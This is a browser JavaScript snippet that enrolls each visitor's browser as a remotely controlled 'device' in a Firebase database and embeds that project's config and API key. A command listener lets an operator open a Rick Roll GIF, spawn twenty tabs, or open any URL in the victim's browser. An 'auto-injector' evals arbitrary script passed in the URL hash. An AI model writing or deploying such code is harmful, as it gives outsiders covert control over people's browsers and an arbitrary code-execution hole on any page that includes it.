(async () => {
  const deviceId = "dev_" + Math.random().toString(36).substring(2, 10);

  const loadFirebase = async () => {
    const s1 = document.createElement("script");
    s1.src = 'https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js';
    document.head.appendChild(s1);
    await new Promise(res => s1.onload = res);
    const s2 = document.createElement("script");
    s2.src = "https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js";
    document.head.appendChild(s2);
    await new Promise(res => s2.onload = res);
  };

  await loadFirebase();

  const config = {
    apiKey: "AIzaSyD5hBBFtSWYOMIk1ZeLqcUKsAubdok4FWk",
    authDomain: 'nebcasino-5aca1.firebaseapp.com',
    databaseURL: "https://nebcasino-5aca1-default-rtdb.firebaseio.com",
    projectId: "nebcasino-5aca1",
    storageBucket: "nebcasino-5aca1.appspot.com",
    messagingSenderId: "907673467348",
    appId: "1:907673467348:web:37b0bcbad757f95845fe41"
  };

  firebase.initializeApp(config);
  const db = firebase.database();
  const ref = db.ref("sessions/public/devices/" + deviceId);
  const update = () => ref.update({ online: true, lastSeen: Date.now() });

  update();
  setInterval(update, 60000);
  window.addEventListener("beforeunload", () => {
    ref.update({ online: false, lastSeen: Date.now() });
  });
  ref.onDisconnect().update({ online: false, lastSeen: Date.now() });

  // Command Listener
  ref.child("action").on("value", snap => {
    const action = snap.val();
    if (!action) return;

    if (action === "rickroll") {
      window.open("https://www.gifcen.com/wp-content/uploads/2022/11/rick-roll-gif-7.gif", "_blank");
    }

    if (action === "tabs") {
      for (let i = 0; i < 20; i++) {
        window.open("https://www.google.com", "_blank");
      }
    }

    if (typeof action === "object" && action.type === "injectTab" && action.url) {
      window.open(action.url, "_blank");
    }

    ref.child("action").set(null);
  });

  // Auto-injector: runs script in #inject param
  const hash = location.hash;
  if (hash.startsWith("#inject=")) {
    try {
      const script = decodeURIComponent(hash.slice(8));
      eval(script);
    } catch (e) {
      console.error("Injection error:", e);
    }
  }
})();
